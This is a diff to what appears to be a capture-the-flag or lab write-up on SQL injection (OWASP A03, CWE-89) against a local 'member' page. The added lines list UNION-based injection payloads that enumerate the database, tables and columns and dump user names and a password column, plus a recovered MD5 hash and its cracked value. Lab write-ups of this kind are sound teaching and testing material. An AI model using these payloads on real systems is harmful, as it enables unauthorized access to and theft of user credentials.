@@ -4,6 +4,19 @@
 **OWASP A03:2021 - Injection** (CWE-89: Improper Neutralization of Special Elements used in an SQL Command)
 
 ## Summary
+
+page: `http://localhost:8080/index.php?page=member`
+commands:
+```sql
+1
+1 OR 1=1
+1 ORDER BY 2
+1 UNION SELECT 1, database()
+1 UNION SELECT 1, table_name FROM information_schema.tables
+1 UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name=0x7573657273
+1 UNION SELECT first_name, countersign FROM users
+```
+
 Found MD5 hash: `5ff9d0165b4f92b14994e5c685cdce28` → cracks to `FortyTwo`
 
 ## The members page
